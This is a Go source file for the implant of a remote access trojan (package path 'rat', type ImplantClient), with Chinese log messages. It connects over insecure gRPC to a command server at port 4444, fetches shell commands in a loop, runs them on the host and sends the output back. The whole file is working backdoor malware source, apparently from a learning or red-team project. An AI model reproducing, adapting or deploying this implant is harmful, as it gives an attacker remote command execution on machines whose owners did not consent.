package main

import (
	"context"
	"google.golang.org/grpc"
	"log"
	"os"
	"os/exec"
	"rat/grpcapi"
	"strings"
	"time"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial("0.0.0.0:4444", opts...); err != nil {
		log.Fatal(err)
	}

	defer conn.Close()

	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	log.SetOutput(os.Stdout)
	for {

		log.Println("获取服务端指令....")
		var req = new(grpcapi.Empty)

		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}

		if cmd.In == "" {
			log.Println("空指令....")
			time.Sleep(1 * time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		log.Println("获取到指令：", tokens)
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)

		}

		buf, err := c.CombinedOutput()
		cmd.Out += string(buf)
		log.Println("运行指令输出：", cmd)
		_, _ = client.SendOutput(ctx, cmd)
	}

}
